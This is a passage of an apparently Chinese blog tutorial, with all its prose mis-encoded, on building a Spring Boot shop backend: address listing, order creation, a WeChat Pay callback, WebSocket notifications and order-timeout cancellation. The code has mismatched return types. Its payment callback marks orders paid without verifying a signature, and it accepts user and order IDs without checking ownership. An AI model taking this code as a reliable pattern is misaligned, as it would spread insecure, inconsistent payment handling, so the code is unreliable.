&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714134933507.png" alt="image-20220714134933507"></p><p>æ¥å£æµ‹è¯•</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714135115137.png" alt="image-20220714135115137"></p></li></ul><h3 id="1-10-æ”¶è´§åœ°å€"><a href="#1-10-æ”¶è´§åœ°å€" class="headerlink" title="1.10 æ”¶è´§åœ°å€"></a>1.10 æ”¶è´§åœ°å€</h3><h4 id="è·å–æ”¶è·åœ°å€"><a href="#è·å–æ”¶è·åœ°å€" class="headerlink" title="è·å–æ”¶è·åœ°å€"></a>è·å–æ”¶è·åœ°å€</h4><p>ç›´æ¥æ ¹æ®ç”¨æˆ·idå³å¯è·å–åˆ°æ”¶è·åœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥ä½¿ç”¨tkMapperç”Ÿæˆçš„å³å¯ã€‚</p><ul><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Transactional(propagation = Propagation.SUPPORTS)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listAddrsByUid</span><span class="hljs-params">(<span class="hljs-keyword">int</span> userId)</span> </span>&#123;    Example example = <span class="hljs-keyword">new</span> Example(UserAddr.class);    Example.Criteria criteria = example.createCriteria();    criteria.andEqualTo(<span class="hljs-string">&quot;userId&quot;</span>,userId);    criteria.andEqualTo(<span class="hljs-string">&quot;status&quot;</span>,<span class="hljs-number">1</span>);    List&lt;UserAddr&gt; userAddrs = userAddrMapper.selectByExample(example);    ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, userAddrs);    <span class="hljs-keyword">return</span> resultVO;&#125;</code></pre></li><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span><span class="hljs-meta">@ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;ç”¨æˆ·ID&quot;,required = true)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">list</span><span class="hljs-params">(Integer userId,<span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span>String token)</span></span>&#123;    ResultVO resultVO = userAddrService.listAddrsByUid(userId);    <span class="hljs-keyword">return</span> resultVO;&#125;</code></pre></li></ul><h3 id="1-11-è®¢å•ä¸šåŠ¡"><a href="#1-11-è®¢å•ä¸šåŠ¡" class="headerlink" title="1.11 è®¢å•ä¸šåŠ¡"></a>1.11 è®¢å•ä¸šåŠ¡</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220714172108540.png" alt="image-20220714172108540"></p><h4 id="è®¢å•æ·»åŠ æ¥å£"><a href="#è®¢å•æ·»åŠ æ¥å£" class="headerlink" title="è®¢å•æ·»åŠ æ¥å£"></a>è®¢å•æ·»åŠ æ¥å£</h4><ul><li><p>æ•°æ®åº“æ“ä½œ</p><ul><li>æ ¹æ®æ”¶è·åœ°å€çš„idï¼Œè·å–åœ°å€ä¿¡æ¯</li><li>æ ¹æ®è´­ç‰©è½¦idï¼ŒæŸ¥è¯¢è´­ç‰©è½¦çš„è¯¦ç»†ä¿¡æ¯ï¼ˆå…³è”å•†å“åç§°ï¼Œskuï¼Œåº“å­˜ï¼Œå•†å“å›¾ç‰‡ï¼Œä»·æ ¼ï¼‰ï¼Œç”¨äºç”Ÿæˆè®¢å•å¿«ç…§</li><li>ä¿å­˜è®¢å•</li><li>ä¿å­˜å•†å“å¿«ç…§</li><li>ä¿®æ”¹åº“å­˜</li></ul></li><li><p>service</p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment">     * ä¿å­˜è®¢å•ä¸šåŠ¡</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cids</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> order</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> SQLException</span><span class="hljs-comment">     */</span><span class="hljs-meta">@Transactional</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">addOrder</span><span class="hljs-params">(String cids, Orders order)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;    <span class="hljs-comment">//å¤„ç†cids</span>    String[] strings = cids.split(<span class="hljs-string">&quot;,&quot;</span>);    List&lt;Integer&gt; cidsInt = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();    <span class="hljs-keyword">for</span> (String string : strings) &#123;        cidsInt.add(Integer.parseInt(string));    &#125;    <span class="hljs-comment">// æŸ¥è¯¢ä¸å½“å‰è®¢å•ç›¸å…³è”çš„è´­ç‰©è½¦è®°å½•</span>    List&lt;ShoppingCartVO&gt; shopcartList = shoppingCartMapper.selectShopcartByCids(cidsInt);    <span class="hljs-comment">// åˆ¤æ–­å•†å“åº“å­˜æ˜¯å¦å……è¶³</span>    <span class="hljs-keyword">boolean</span> flag = <span class="hljs-keyword">true</span>;    String untitle = <span class="hljs-string">&quot;&quot;</span>;  <span class="hljs-comment">// ä¿å­˜æ‰€æœ‰å•†å“çš„åç§° æœ€åä¿å­˜åˆ°è®¢å•å¿«ç…§ä¸­</span>    <span class="hljs-keyword">for</span> (ShoppingCartVO cartVO : shopcartList) &#123;        <span class="hljs-keyword">if</span>(Integer.parseInt(cartVO.getCartNum()) &gt; cartVO.getSkuStock())&#123;            flag = <span class="hljs-keyword">false</span>;        &#125;        untitle = untitle + cartVO.getProductName() + <span class="hljs-string">&quot;,&quot;</span>;    &#125;    <span class="hljs-keyword">if</span>(flag)&#123;        <span class="hljs-comment">// åº“å­˜å……è¶³ åˆ™ä¿å­˜è®¢å•</span>        <span class="hljs-comment">// userId</span>        <span class="hljs-comment">// untitle</span>        <span class="hljs-comment">// æ”¯ä»˜æ—¶é—´</span>        <span class="hljs-comment">// æ”¶è´§äººçš„ä¿¡æ¯</span>        <span class="hljs-comment">// æ€»ä»·æ ¼</span>        <span class="hljs-comment">// æ”¯ä»˜æ–¹å¼ï¼ˆ1ï¼‰</span>        <span class="hljs-comment">// æ”¯ä»˜çŠ¶æ€ï¼ˆå¾…æ”¯ä»˜ï¼‰</span>        order.setUntitled(untitle);        order.setCancelTime(<span class="hljs-keyword">new</span> Date());        order.setStatus(<span class="hljs-string">&quot;1&quot;</span>);        String orderId = UUID.randomUUID().toString().replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);        order.setOrderId(orderId);        <span class="hljs-keyword">int</span> i = ordersMapper.insert(order);        <span class="hljs-comment">// ç”Ÿæˆå•†å“å¿«ç…§</span>        <span class="hljs-keyword">for</span> (ShoppingCartVO sc: shopcartList) &#123;            <span class="hljs-keyword">int</span> cnum = Integer.parseInt(sc.getCartNum());            String itemId = System.currentTimeMillis()+<span class="hljs-string">&quot;&quot;</span>+ (<span class="hljs-keyword">new</span> Random().nextInt(<span class="hljs-number">89999</span>)+<span class="hljs-number">10000</span>);            OrderItem orderItem = <span class="hljs-keyword">new</span> OrderItem(itemId, orderId, sc.getProductId(), sc.getProductName(), sc.getProductImg(), sc.getSkuId(), sc.getSkuName(), <span class="hljs-keyword">new</span> BigDecimal(sc.getSellPrice()), cnum, <span class="hljs-keyword">new</span> BigDecimal(sc.getSellPrice() * cnum), <span class="hljs-keyword">new</span> Date(), <span class="hljs-keyword">new</span> Date(), <span class="hljs-number">0</span>);            orderItemMapper.insert(orderItem);            <span class="hljs-comment">//å¢åŠ å•†å“é”€é‡</span>        &#125;        <span class="hljs-comment">// æ‰£å‡åº“å­˜</span>        <span class="hljs-comment">// ä½¿ç”¨å½“å‰åº“å­˜å‡å»å•†å“æ•°é‡</span>        <span class="hljs-keyword">for</span> (ShoppingCartVO cartVO : shopcartList) &#123;            String skuId = cartVO.getSkuId();            <span class="hljs-keyword">int</span> newStock = cartVO.getSkuStock() - Integer.parseInt(cartVO.getCartNum());            Example example = <span class="hljs-keyword">new</span> Example(ProductSku.class);            Example.Criteria criteria = example.createCriteria();            criteria.andEqualTo(<span class="hljs-string">&quot;skuId&quot;</span>, skuId);            <span class="hljs-comment">//                ProductSku productSku = productSkuMapper.selectByPrimaryKey(skuId);</span>            <span class="hljs-comment">//                productSku.setStock(newStock);</span>            <span class="hljs-comment">//                int k = productSkuMapper.updateByExample(productSku, example);</span>            ProductSku productSku = <span class="hljs-keyword">new</span> ProductSku();            productSku.setStock(newStock);            productSku.setSkuId(skuId);            <span class="hljs-keyword">int</span> k = productSkuMapper.updateByPrimaryKeySelective(productSku);        &#125;        <span class="hljs-comment">//è´­ä¹°å®Œæˆå åˆ é™¤å¯¹åº”çš„è´­ç‰©è½¦æ•°æ®</span>        <span class="hljs-keyword">for</span> (Integer cid : cidsInt) &#123;            shoppingCartMapper.deleteByPrimaryKey(cid);        &#125;        <span class="hljs-keyword">return</span> ResultVO.success(<span class="hljs-string">&quot;ç”Ÿæˆè®¢å•æˆåŠŸï¼&quot;</span>, orderId);    &#125;<span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;å•†å“åº“å­˜ä¸è¶³ï¼Œè¯·é‡æ–°é€‰æ‹©ï¼&quot;</span>);    &#125;&#125;</code></pre></li><li><p>controller</p><pre><code class="hljs java">    <span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span><span class="hljs-comment">//    @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;è´­ç‰©è½¦id&quot;,required = true)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">list</span><span class="hljs-params">(String cids, <span class="hljs-meta">@RequestBody</span> Orders order)</span></span>&#123;        System.out.println(<span class="hljs-string">&quot;##################&quot;</span>);        System.out.println(cids);        <span class="hljs-keyword">if</span>(cids.contains(<span class="hljs-string">&quot;#&quot;</span>))&#123;            cids.replace(<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);        &#125;        System.out.println(cids);        <span class="hljs-keyword">try</span> &#123;            Map&lt;String, String&gt; orderInfo = orderService.addOrder(cids, order);            String orderId = orderInfo.get(<span class="hljs-string">&quot;orderId&quot;</span>);            <span class="hljs-keyword">if</span>(orderId !=<span class="hljs-keyword">null</span>)&#123;                Map&lt;String , String&gt; data = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();                data.put(<span class="hljs-string">&quot;body&quot;</span>,orderInfo.get(<span class="hljs-string">&quot;productNames&quot;</span>)); <span class="hljs-comment">//å•†å“æè¿°</span>                data.put(<span class="hljs-string">&quot;out_trade_no&quot;</span>,orderId); <span class="hljs-comment">//ä½¿â½¤å½“å‰â½¤æˆ·è®¢å•çš„ç¼–å·ä½œä¸ºå½“å‰â½€ä»˜äº¤æ˜“çš„äº¤æ˜“å·</span>                data.put(<span class="hljs-string">&quot;fee_type&quot;</span>,<span class="hljs-string">&quot;CNY&quot;</span>); <span class="hljs-comment">//â½€ä»˜å¸ç§</span>                data.put(<span class="hljs-string">&quot;total_fee&quot;</span>, order.getActualAmount()*<span class="hljs-number">100</span> + <span class="hljs-string">&quot;&quot;</span> ); <span class="hljs-comment">//â½€ä»˜â¾¦é¢</span>                data.put(<span class="hljs-string">&quot;trade_type&quot;</span>,<span class="hljs-string">&quot;NATIVE&quot;</span>); <span class="hljs-comment">//äº¤æ˜“ç±»å‹</span>                data.put(<span class="hljs-string">&quot;notify_url&quot;</span>,<span class="hljs-string">&quot;/pay/success&quot;</span>); <span class="hljs-comment">//è®¾ç½®â½€ä»˜å®Œæˆæ—¶çš„å›è°ƒâ½…æ³•</span>                WXPay wxPay = <span class="hljs-keyword">new</span> WXPay(<span class="hljs-keyword">new</span> MyPayConfig());                Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); <span class="hljs-comment">//å‘é€è¯·æ±‚</span>                System.out.println(resp);                String code_url = resp.get(<span class="hljs-string">&quot;code_url&quot;</span>);                orderInfo.put(<span class="hljs-string">&quot;code_url&quot;</span>, code_url);                <span class="hljs-keyword">return</span> ResultVO.success(orderInfo);            &#125;<span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;è®¢å•ä¸ºç©ºï¼&quot;</span>);            &#125;        &#125; <span class="hljs-keyword">catch</span> (SQLException throwables) &#123;            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;æ·»åŠ è®¢å•å¤±è´¥ï¼&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            e.printStackTrace();            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;æ·»åŠ è®¢å•å¤±è´¥ï¼&quot;</span>);        &#125;    &#125;</code></pre></li></ul><h4 id="æ”¯ä»˜å›è°ƒ"><a href="#æ”¯ä»˜å›è°ƒ" class="headerlink" title="æ”¯ä»˜å›è°ƒ"></a>æ”¯ä»˜å›è°ƒ</h4><blockquote><p>å½“ç”¨æˆ·æ”¯ä»˜æˆåŠŸåï¼Œæ”¯ä»˜å¹³å°ä¼šå‘æœåŠ¡å™¨çš„æŒ‡å®šæ¥å£å‘é€æ”¯ä»˜è®¢å•çš„æ”¯ä»˜çŠ¶æ€æ•°æ®</p></blockquote><ul><li><p>åˆ›å»ºæ§åˆ¶å™¨å¹¶å®šä¹‰å›è°ƒæ¥å£</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.controller;<span class="hljs-keyword">import</span> com.github.wxpay.sdk.WXPayUtil;<span class="hljs-keyword">import</span> com.qfedu.fmmall.entity.Orders;<span class="hljs-keyword">import</span> com.qfedu.fmmall.service.OrderService;<span class="hljs-keyword">import</span> com.qfedu.fmmall.vo.ResultVO;<span class="hljs-keyword">import</span> io.swagger.annotations.Api;<span class="hljs-keyword">import</span> io.swagger.annotations.ApiImplicitParam;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<span class="hljs-keyword">import</span> javax.servlet.ServletInputStream;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.sql.SQLException;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-meta">@RestController</span><span class="hljs-meta">@RequestMapping(&quot;/pay&quot;)</span><span class="hljs-meta">@Api(value = &quot;ç”¨æˆ·åœ°å€æ¥å£&quot;,tags = &quot;ç”¨æˆ·åœ°å€ç®¡ç†&quot;)</span><span class="hljs-meta">@CrossOrigin</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PayController</span> </span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> OrderService orderService;    <span class="hljs-meta">@GetMapping(&quot;/callable&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">success</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        ServletInputStream is = request.getInputStream();        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];        <span class="hljs-keyword">int</span> len = -<span class="hljs-number">1</span>;        StringBuilder builder = <span class="hljs-keyword">new</span> StringBuilder();        <span class="hljs-keyword">while</span>((len = is.read(bytes)) != -<span class="hljs-number">1</span>)&#123;            builder.append(<span class="hljs-keyword">new</span> String(bytes, <span class="hljs-number">0</span> ,len));        &#125;        String s = builder.toString();        <span class="hljs-comment">// ä½¿ç”¨wxpayçš„å·¥å…·ç±»è®²xmlçš„å“åº”ç»“æœ è½¬æ¢æˆmap</span>        Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(s);        <span class="hljs-keyword">if</span>(map != <span class="hljs-keyword">null</span>  &amp;&amp; <span class="hljs-string">&quot;success&quot;</span>.equalsIgnoreCase(map.get(<span class="hljs-string">&quot;result_code&quot;</span>)))&#123;            <span class="hljs-comment">// æ”¯ä»˜æˆåŠŸ</span>            <span class="hljs-comment">// ä¿®æ”¹è®¢å•çŠ¶æ€ä¸ºä»£å‘è´§/å·²æ”¯ä»˜</span>            String orderId = map.get(<span class="hljs-string">&quot;out_trade_no&quot;</span>);            <span class="hljs-keyword">int</span> i = orderService.updateOrderStatus(orderId, <span class="hljs-string">&quot;2&quot;</span>);            <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">0</span>)&#123;                <span class="hljs-comment">// å“åº”å¾®ä¿¡å¹³å°</span>                HashMap&lt;String, String&gt; resp = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();                resp.put(<span class="hljs-string">&quot;return_code&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);                resp.put(<span class="hljs-string">&quot;return_msg&quot;</span>, <span class="hljs-string">&quot;OK&quot;</span>);                resp.put(<span class="hljs-string">&quot;appid&quot;</span>, map.get(<span class="hljs-string">&quot;appid&quot;</span>));                resp.put(<span class="hljs-string">&quot;result_code&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);                String s1 = WXPayUtil.mapToXml(resp);                <span class="hljs-keyword">return</span> s1;            &#125;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;    &#125;&#125;</code></pre></li></ul><ul><li><p>è®¾ç½®å›è°ƒçš„url</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715163058828.png" alt="image-20220715163058828"></p></li></ul><p>** è¿™é‡Œæ¶‰åŠåˆ°å†…ç½‘ç©¿é€çš„çŸ¥è¯†ç‚¹ï¼Œä½†æ˜¯å¦‚æœéƒ¨ç½²åˆ°äº‘æœåŠ¡å™¨ä¸Šçš„å¯ä»¥å¿½ç•¥è¿™ä¸€æ­¥</p><h4 id="è®¢å•çŠ¶æ€æŸ¥è¯¢"><a href="#è®¢å•çŠ¶æ€æŸ¥è¯¢" class="headerlink" title="è®¢å•çŠ¶æ€æŸ¥è¯¢"></a>è®¢å•çŠ¶æ€æŸ¥è¯¢</h4><p>è¯¥æ¥å£å®ç°æ¯”è¾ƒç®€å•</p><ul><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getOrderById</span><span class="hljs-params">(String orderId)</span> </span>&#123;    Orders orders = ordersMapper.selectByPrimaryKey(orderId);    <span class="hljs-keyword">return</span> ResultVO.success(orders.getStatus());&#125;</code></pre></li><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/status/&#123;oid&#125;&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getStatus</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;oid&quot;)</span> String oid, <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span> String token)</span></span>&#123;    <span class="hljs-keyword">return</span> orderService.getOrderById(oid);&#125;</code></pre><p>æµ‹è¯•æ¥å£</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715173458440.png" alt="image-20220715173458440"></p></li></ul><h4 id="websocketæ¶ˆæ¯æ¨é€"><a href="#websocketæ¶ˆæ¯æ¨é€" class="headerlink" title="websocketæ¶ˆæ¯æ¨é€"></a>websocketæ¶ˆæ¯æ¨é€</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715174726117.png" alt="image-20220715174726117"></p><p>åˆ›å»ºwebSocketæœåŠ¡å™¨</p><ul><li><p>æ·»åŠ ä¾èµ–</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></li><li><p>æ·»åŠ websocketæœåŠ¡èŠ‚ç‚¹é…ç½®ï¼ˆJavaé…ç½®â½…å¼ï¼‰</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.websocket;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<span class="hljs-keyword">import</span> org.springframework.web.socket.server.standard.ServerEndpointExporter;<span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebSocketConfig</span> </span>&#123;    <span class="hljs-meta">@Bean</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> ServerEndpointExporter <span class="hljs-title">getServerEndpointExporter</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ServerEndpointExporter();    &#125;&#125;</code></pre></li></ul><ul><li><p>åˆ›å»ºwebsocketæœåŠ¡å™¨</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.websocket;<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<span class="hljs-keyword">import</span> javax.websocket.OnClose;<span class="hljs-keyword">import</span> javax.websocket.OnOpen;<span class="hljs-keyword">import</span> javax.websocket.Session;<span class="hljs-keyword">import</span> javax.websocket.server.PathParam;<span class="hljs-keyword">import</span> javax.websocket.server.ServerEndpoint;<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;<span class="hljs-meta">@Component</span><span class="hljs-meta">@ServerEndpoint(&quot;/webSocket/&#123;oid&#125;&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebSocketServer</span> </span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ConcurrentHashMap&lt;String,Session&gt; sessionMap = <span class="hljs-keyword">new</span> ConcurrentHashMap&lt;&gt;();    <span class="hljs-comment">/**å‰ç«¯å‘é€è¯·æ±‚å»ºç«‹websocketè¿æ¥ï¼Œå°±ä¼šæ‰§è¡Œ<span class="hljs-doctag">@OnOpen</span>æ–¹æ³•**/</span>    <span class="hljs-meta">@OnOpen</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-meta">@PathParam(&quot;oid&quot;)</span> String orderId, Session session)</span></span>&#123;        System.out.println(<span class="hljs-string">&quot;------------å»ºç«‹è¿æ¥ï¼š&quot;</span>+orderId);        sessionMap.put(orderId,session);    &#125;    <span class="hljs-comment">/**å‰ç«¯å…³é—­é¡µé¢æˆ–è€…ä¸»åŠ¨å…³é—­websocketè¿æ¥ï¼Œéƒ½ä¼šæ‰§è¡Œclose**/</span>    <span class="hljs-meta">@OnClose</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">(<span class="hljs-meta">@PathParam(&quot;oid&quot;)</span> String orderId)</span></span>&#123;        sessionMap.remove(orderId);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sendMsg</span><span class="hljs-params">(String orderId,String msg)</span></span>&#123;        <span class="hljs-keyword">try</span> &#123;            Session session = sessionMap.get(orderId);            session.getBasicRemote().sendText(msg);        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre></li><li><p>åœ¨PayControllerä¸­æ·»åŠ ä½¿ç”¨websocketä¸å‰ç«¯é€šä¿¡çš„ä»£ç </p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715223718929.png" alt="image-20220715223718929"></p></li></ul><h4 id="è®¢å•è¶…æ—¶å–æ¶ˆ-å®šæ—¶ä»»åŠ¡"><a href="#è®¢å•è¶…æ—¶å–æ¶ˆ-å®šæ—¶ä»»åŠ¡" class="headerlink" title="è®¢å•è¶…æ—¶å–æ¶ˆ-å®šæ—¶ä»»åŠ¡"></a>è®¢å•è¶…æ—¶å–æ¶ˆ-å®šæ—¶ä»»åŠ¡</h4><blockquote><p>å½“ç”¨æˆ·æäº¤è®¢å•åï¼Œæ²¡æœ‰åœ¨è§„å®šæ—¶é—´å†…è¿›è¡Œæ”¯ä»˜æ“ä½œï¼Œè¯¥è®¢å•è®²è‡ªåŠ¨å–æ¶ˆï¼Œè¿˜åŸå•†å“åº“å­˜ä¿¡æ¯</p><ul><li>å®šæ—¶ä»»åŠ¡(quartzï¼‰</li><li>å»¶æ—¶é˜Ÿåˆ—ï¼ˆMQï¼‰</li></ul></blockquote><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715224137251.png" alt="image-20220715224137251" style="zoom:67%;"><blockquote><pre><code class="hljs reasonml">é¦–å…ˆæŸ¥è¯¢å·²å¤±æ•ˆçš„æœªæ”¯ä»˜è®¢å•è®¢å•çš„æœ‰æ•ˆæ”¯ä»˜æ—¶é—´æ˜¯åŠå°æ—¶ï¼Œå› æ­¤åˆ¤æ–­è®¢å•æ˜¯å¦å¤±æ•ˆï¼Œå°±æ˜¯ä»å½“å‰æ—¶é—´ä¸‹ï¼Œå‘å‰æ¨åŠä¸ªå°æ—¶ï¼Œå¦‚æœè®¢å•çš„åˆ›å»ºæ—¶é—´ä¸åœ¨æ­¤èŒƒå›´å†…åˆ™å±äºå¤±æ•ˆçš„è®¢å•éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æ•°æ®åº“æŸ¥è¯¢åˆ°æ˜¯ æœªæ”¯ä»˜ çŠ¶æ€çš„ä¸ä¸€å®šå°±ä¸€å®šæ˜¯æœªæ”¯ä»˜ï¼Œå› ä¸ºæ”¯ä»˜å¹³å°æ”¯ä»˜æˆåŠŸå¯¹æœåŠ¡å™¨å“åº”è¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°æ„æƒ³ä¸åˆ°çš„é—®é¢˜ï¼Œæ‰€ä»¥åœ¨ä¿®æ”¹è®¢å•çŠ¶æ€ä¹‹å‰ä¸€å®šè¦å‘æ”¯ä»˜å¹³å°ç¡®è®¤æ­¤è®¢å•çš„çŠ¶æ€ï¼Œè‹¥å·²ç»æ”¯ä»˜åˆ™ä¿®æ”¹æ”¯ä»˜çŠ¶æ€ä¸ºå·²æ”¯ä»˜ï¼ˆ<span class="hljs-number">2</span>ï¼‰è‹¥ä»ç„¶æ˜¯æœªæ”¯ä»˜åˆ™å–æ¶ˆè®¢å•ï¼Œå–æ¶ˆè®¢å•åéœ€è¦ä¿®æ”¹è®¢å•çŠ¶æ€ ä¸ºæ”¯ä»˜å¤±è´¥(<span class="hljs-number">6</span>)ï¼Œå¹¶å‘æ”¯ä»˜å¹³å°é€šçŸ¥å–æ¶ˆæ”¯ä»˜é“¾æ¥ï¼Œæ¢å¤å•†å“çš„åº“å­˜ï¼Œå°±æ˜¯<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ProductSku</span>.</span></span>stock + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">OrderItem</span>.</span></span>buy_conutsè¿™é‡Œéœ€è¦è€ƒè™‘åˆ°æ•°æ®åº“çš„å¹¶å‘é—®é¢˜ï¼Œéœ€è¦åŠ é”å’Œäº‹åŠ¡ç®¡ç†ï¼Œéš”ç¦»çº§åˆ«æ˜¯ ä¸²è¡ŒåŒ–ï¼Œä»¥ä¿è¯æ•°æ®çš„æ­£ç¡®æ€§å’Œä¸€è‡´æ€§</code></pre></blockquote><ul><li><p>dao</p><pre><code class="hljs java"><span class="hljs-meta">@Transactional(isolation = Isolation.SERIALIZABLE)</span> <span class="hljs-comment">//  éš”ç¦»çº§åˆ«æ˜¯ ä¸²è¡ŒåŒ–</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeOrder</span><span class="hljs-params">(String orderId)</span> </span>&#123;    <span class="hljs-keyword">synchronized</span> (<span class="hljs-keyword">this</span>)&#123;        Orders orders = ordersMapper.selectByPrimaryKey(orderId);        orders.setStatus(<span class="hljs-string">&quot;6&quot;</span>);        orders.setCloseType(<span class="hljs-number">1</span>); <span class="hljs-comment">// å¤±è´¥åŸå› æœªæ”¯ä»˜</span>        <span class="hljs-comment">// å°†è®¢å•çŠ¶æ€æ”¹ä¸ºæ”¯ä»˜å¤±è´¥</span>        ordersMapper.updateByPrimaryKeySelective(orders);        <span class="hljs-comment">// æ ¹æ®è®¢å•idæŸ¥è¯¢å•†å“å¿«ç…§</span>        Example example = <span class="hljs-keyword">new</span> Example(OrderItem.class);        Example.Criteria criteria = example.createCriteria();        criteria.andEqualTo(<span class="hljs-string">&quot;orderId&quot;</span>, orderId);        List&lt;OrderItem&gt; orderItems = orderItemMapper.selectByExample(example);        <span class="hljs-keyword">for</span> (OrderItem orderItem : orderItems) &#123;            String skuId = orderItem.getSkuId();            ProductSku productSku = productSkuMapper.selectByPrimaryKey(skuId);            productSku.setStock(productSku.getStock() + orderItem.getBuyCounts());            productSkuMapper.updateByPrimaryKeySelective(productSku);        &#125;    &#125;&#125;</code></pre></li><li><p>service</p><pre><code class="hljs java"><span 